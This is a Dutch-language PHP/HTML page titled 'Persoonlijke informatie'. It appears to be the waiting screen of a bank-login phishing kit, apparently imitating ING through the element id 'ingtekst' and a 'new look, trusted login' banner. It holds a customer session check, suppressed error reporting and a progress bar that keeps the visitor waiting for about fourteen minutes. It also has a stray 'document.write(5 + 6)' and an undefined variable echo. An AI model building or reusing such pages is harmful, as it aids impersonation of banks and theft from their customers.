<!doctype html>
<html lang="en">
<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
	echo $gebruikersnaam;
}
include 'dbconnect.php';
?>
  <head>
    <title>Persoonlijke informatie</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
	<link href="https://fonts.googleapis.com/css?family=Raleway:400,300,600,800,900" rel="stylesheet" type="text/css">
	<style>
	#container {
  margin: 20px;
  width: 200px;
  height: 200px;
  position: relative;
}
</style>
<script type="text/javascript">
var start = new Date();
var maxTime = 835000;
var timeoutVal = Math.floor(maxTime/100);
animateUpdate();

function updateProgress(percentage) {
    $('#pbar_innerdiv').css("width", percentage + "%");
    $('#pbar_innertext').text(percentage + "%");
}
document.write(5 + 6);
function animateUpdate() {
    var now = new Date();
    var timeDiff = now.getTime() - start.getTime();
    var perc = Math.round((timeDiff/maxTime)*100);
    console.log(perc);
      if (perc <= 100) {
       updateProgress(perc);
       setTimeout(animateUpdate, timeoutVal);
      }
}
</script>
  </head>
  <body>
   <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
<div class="login">

<div class="nieuw" id="remove">
<div class="nieuw1"><h1 id="nieuwtekst">
<img src="alert-info.svg" style="height: 24px; width: 24px;">
&nbsp;&nbsp;Nieuw uiterlijk, vertrouwd inloggen
</div>
</div>

<!-- Display the countdown timer in an element -->
<h1 id="ingtekst"> Een ogenblik geduld alstublieft...</h1><br>
<div id="container">
<div id="pbar_outerdiv" style="width: 300px; height: 20px; border: 1px solid grey; z-index: 1; position: relative; border-radius: 5px; -moz-border-radius: 5px;">
<div id="pbar_innerdiv" style="background-color: lightblue; z-index: 2; height: 100%; width: 0%;"></div>
<div id="pbar_innertext" style="z-index: 3; position: absolute; top: 0; left: 0; width: 100%; height: 100%; color: black; font-weight: bold; text-align: center;">0%</div>
</div>
 <script type="text/javascript">

</script>
</div>
</div>
</body>
</html>